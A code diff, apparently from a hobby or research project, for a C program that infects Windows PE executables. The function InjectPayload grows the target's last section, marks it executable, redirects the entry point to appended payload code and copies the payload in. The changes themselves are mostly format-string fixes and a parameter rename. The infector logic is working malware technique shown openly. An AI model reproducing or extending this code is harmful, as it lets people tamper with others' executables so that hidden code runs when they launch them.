@@ -4,11 +4,6 @@
 #include "payload.h"
 #include "utils.h"
 
-#define PAGE_ALIGN(x, size) (((x) + ((size) - 1)) & ~((size) - 1))
-
-// TODO: Inject into end of .text, between virtsize and rawsize (unused space)
-// Ideas: Packing, unpacking, function hashing
-
 EXTERN_C_START
 extern CONST VOID payload();
 extern LONGLONG delta_start;
@@ -16,47 +11,47 @@ extern LONGLONG to_c_code;
 extern DWORD code_size;
 EXTERN_C_END
 
-VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PCBYTE pPayload,
+VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
                    IN CONST DWORD dwPayloadSize) {
-    PIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     WORD wNbSections;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
-    DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwOrigEntryPoint, dwNewEntryPoint;
+    DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr, dwOrigEntryPoint,
+        dwNewEntryPoint;
 
-    pDosHeader = (PIMAGE_DOS_HEADER)pMapAddress;
-    pNtHeader = (PIMAGE_NT_HEADERS64)((PCBYTE)pDosHeader + pDosHeader->e_lfanew);
+    pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
     wNbSections = pNtHeader->FileHeader.NumberOfSections;
     pSection = IMAGE_FIRST_SECTION(pNtHeader);
     dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
-    printf("File alignment: %#x (%u)\n", dwFileAlignment, dwFileAlignment);
+    printf("File alignment: %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);
 
     pLastSection = &pSection[wNbSections - 1];
     dwLastSectionPtr = pLastSection->PointerToRawData;
     dwLastSectionSize = pLastSection->SizeOfRawData;
+    dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
     dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
-    printf("Entry point: %#010x\n", dwOrigEntryPoint);
+    printf("Entry point: %#010lx\n", dwOrigEntryPoint);
     printf("Last section: %s\n", pLastSection->Name);
-    printf("Last section pointer: %#010x\n", dwLastSectionPtr);
-    printf("Last section raw size: %#x (%u)\n", dwLastSectionSize, dwLastSectionSize);
-    printf("Last section virtsize: %#x (%u)\n", pLastSection->Misc.VirtualSize,
+    printf("Last section pointer: %#010lx\n", dwLastSectionPtr);
+    printf("Last section raw size: %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
+    printf("Last section virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
            pLastSection->Misc.VirtualSize);
-    printf("Size of code: %u\n", pNtHeader->OptionalHeader.SizeOfCode);
+    printf("Size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
 
     pLastSection->Misc.VirtualSize += dwPayloadSize;
     // DWORD dwNewSize = PAGE_ALIGN(pLastSection->Misc.VirtualSize, dwFileAlignment);
-    // printf("New size: %#x (%u)\n", dwNewSize, dwNewSize);
+    // printf("New size: %#lx (%lu)\n", dwNewSize, dwNewSize);
     pLastSection->SizeOfRawData += dwPayloadSize;
     pNtHeader->OptionalHeader.SizeOfCode += dwPayloadSize;
     pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
-    printf("New raw size: %#x (%u)\n", pLastSection->SizeOfRawData, pLastSection->SizeOfRawData);
-    printf("New virtsize: %#x (%u)\n", pLastSection->Misc.VirtualSize,
+    printf("New raw size: %#lx (%lu)\n", pLastSection->SizeOfRawData, pLastSection->SizeOfRawData);
+    printf("New virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
            pLastSection->Misc.VirtualSize);
-    printf("New size of code: %u\n", pNtHeader->OptionalHeader.SizeOfCode);
+    printf("New size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
 
     dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize;
     pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
-    printf("New entry point: %#010x\n", dwNewEntryPoint);
+    printf("New entry point: %#010lx\n", dwNewEntryPoint);
 
     DWORD dwOldProtect;
     VirtualProtect(&delta_start, sizeof(delta_start), PAGE_READWRITE, &dwOldProtect);
@@ -67,7 +62,7 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PCBYTE pPayl
     printf("New payload:\n");
     HexDump(pPayload, dwPayloadSize);
 
-    memcpy((PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize, pPayload, dwPayloadSize);
+    memcpy((PBYTE)pDosHeader + dwPayloadPtr, pPayload, dwPayloadSize);
 }
 
 int main(int argc, char* argv[]) {
@@ -78,9 +73,9 @@ int main(int argc, char* argv[]) {
     ULARGE_INTEGER uliSize, uliOffset;
 
     dwPayloadSize = (DWORD)((PCBYTE)&code_size - (PCBYTE)&payload + sizeof(code_size));
-    printf("Payload size: %u\n", dwPayloadSize);
+    printf("Payload size: %lu\n", dwPayloadSize);
     printf("Payload: %p\n", &payload);
-    HexDump((PCBYTE)&payload, dwPayloadSize);
+    // HexDump((PCBYTE)&payload, dwPayloadSize);
 
     if (argc < 2) {
         fprintf(stderr, "Usage: %s <filename.exe>\n", argv[0]);
@@ -99,7 +94,7 @@ int main(int argc, char* argv[]) {
     }
 
     dwFileSize = GetFileSize(hFile, NULL);
-    printf("File size: %u bytes\n", dwFileSize);
+    printf("File size: %lu bytes\n", dwFileSize);
     DWQUAD(uliSize) = dwFileSize + dwPayloadSize;
 
     hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
